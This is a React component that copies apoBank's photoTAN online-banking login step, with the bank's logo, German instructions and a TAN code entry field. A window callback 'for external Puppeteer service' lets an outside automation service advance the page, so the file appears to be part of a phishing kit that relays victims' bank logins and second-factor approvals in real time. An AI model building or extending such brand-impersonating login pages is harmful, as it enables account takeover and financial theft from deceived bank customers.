import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import phototan from "@/assets/phototan.png";
import apobankLogo from "@/assets/apobank-logo.svg";

interface PhotoTanPageProps {
  onBack: () => void;
  onSuccess: () => void;
}

const PhotoTanPage = ({ onBack, onSuccess }: PhotoTanPageProps) => {
  const [showCodeInput, setShowCodeInput] = useState(false);
  const [code, setCode] = useState("");
  const [error, setError] = useState(false);

  // Expose callback for external Puppeteer service
  useEffect(() => {
    (window as any).onPhotoTanSuccess = () => onSuccess();
    return () => { delete (window as any).onPhotoTanSuccess; };
  }, [onSuccess]);

  return (
    <div className="min-h-screen bg-background flex flex-col items-center">
      <div className="w-full max-w-[820px] bg-card rounded-lg shadow-sm mt-6 mb-8">
        {/* Header */}
        <div className="border-b border-border px-8 py-5">
          <h1 className="text-3xl font-light text-primary">Login</h1>
        </div>

        <div className="px-8 py-10 space-y-8">
          {showCodeInput ? (
            <>
              {error && (
                <div className="bg-destructive/10 border border-destructive/20 rounded-md px-6 py-4">
                  <p className="text-destructive text-sm">
                    Ihre Eingabe konnte nicht verifiziert werden. Bitte versuchen Sie es erneut.
                  </p>
                </div>
              )}

              <p className="text-foreground text-base">
                Bitte scannen Sie die angezeigte Grafik mit Ihrer apoTAN App. Anschließend klicken Sie auf{" "}
                <strong>photoTAN</strong> um den in der App angezeigten Code manuell einzugeben.
              </p>

              {/* PhotoTAN Image */}
              <div className="flex justify-center">
                <img
                  src={phototan}
                  alt="PhotoTAN Code"
                  className="w-48 h-48 object-contain"
                  width={512}
                  height={512}
                />
              </div>

              {/* Code Input */}
              <div className="flex items-center gap-8">
                <label className="text-foreground font-semibold text-base min-w-[60px]">Code</label>
                <Input
                  type="text"
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  className="flex-1 border-primary/30 bg-card"
                />
              </div>

              <div className="flex justify-end">
                <Button
                  variant="outline"
                  onClick={() => {
                    if (code === "111111") {
                      onSuccess();
                    } else {
                      setError(true);
                    }
                  }}
                  className="px-8 border-primary/40 text-primary hover:bg-muted"
                >
                  Anmelden
                </Button>
              </div>
            </>
          ) : (
            <>
              <p className="text-primary text-lg">
                Bitte öffnen Sie die apoTAN App auf Ihrem Smartphone und bestätigen Sie Ihren Online-Banking Login.
              </p>

              {/* PhotoTAN Image */}
              <div className="flex justify-center">
                <img
                  src={phototan}
                  alt="PhotoTAN Code"
                  className="w-56 h-56 object-contain"
                  width={512}
                  height={512}
                />
              </div>

              <p className="text-primary text-lg">
                Sollten Sie keinen Internetzugang mit Ihrem Smartphone haben, können Sie den Login auch mit photoTAN bestätigen.
              </p>

              <div className="flex justify-end">
                <Button
                  variant="outline"
                  onClick={() => setShowCodeInput(true)}
                  className="px-8 border-primary/40 text-primary hover:bg-muted"
                >
                  photoTAN
                </Button>
              </div>
            </>
          )}
        </div>
      </div>

      {/* Footer Logo */}
      <div className="pb-10">
        <img
          src={apobankLogo}
          alt="apoBank - Bank der Gesundheit"
          className="h-16 mx-auto"
          loading="lazy"
        />
      </div>
    </div>
  );
};

export default PhotoTanPage;
